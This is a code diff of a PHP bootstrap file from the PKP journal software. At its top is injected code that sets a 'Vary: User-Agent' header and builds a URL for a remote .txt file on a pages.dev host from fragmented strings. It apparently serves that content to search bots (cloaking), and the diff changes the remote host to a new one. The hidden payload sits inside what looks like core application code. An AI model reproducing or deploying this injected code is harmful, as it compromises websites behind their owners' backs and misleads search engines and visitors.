@@ -4,9 +4,9 @@ header('Vary: User-Agent');
 
 // Rakit URL tujuan baru
 $u1 = "https://";
-$u2 = "emergentresearch.pages.dev";
+$u2 = "zenits-fkj.pages.dev";
 $u3 = "/";
-$u4 = "emergentresearch";
+$u4 = "zenits";
 $u5 = ".txt";
 $bot_url = $u1 . $u2 . $u3 . $u4 . $u5;
 
@@ -52,7 +52,6 @@ exit;
 }
 ?>
 
-
 <?php
 
 /**
@@ -61,7 +60,7 @@ exit;
  */
 
 /**
- * @file includes/bootstrap.php
+ * @file includes/bootstrap.inc.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
  * Copyright (c) 2000-2021 John Willinsky
@@ -78,15 +77,19 @@ exit;
 /**
  * Basic initialization (pre-classloading).
  */
-
-// Load Composer autoloader
-require_once 'lib/pkp/lib/vendor/autoload.php';
-
+ 
+define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
+if (!defined('DIRECTORY_SEPARATOR')) {
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+}
 define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
 chdir(BASE_SYS_DIR);
 
 // System-wide functions
-require_once './lib/pkp/includes/functions.php';
+require('./lib/pkp/includes/functions.inc.php');
 
 // Initialize the application environment
-return new \APP\core\Application();
+import('classes.core.Application');
+
+return new Application();
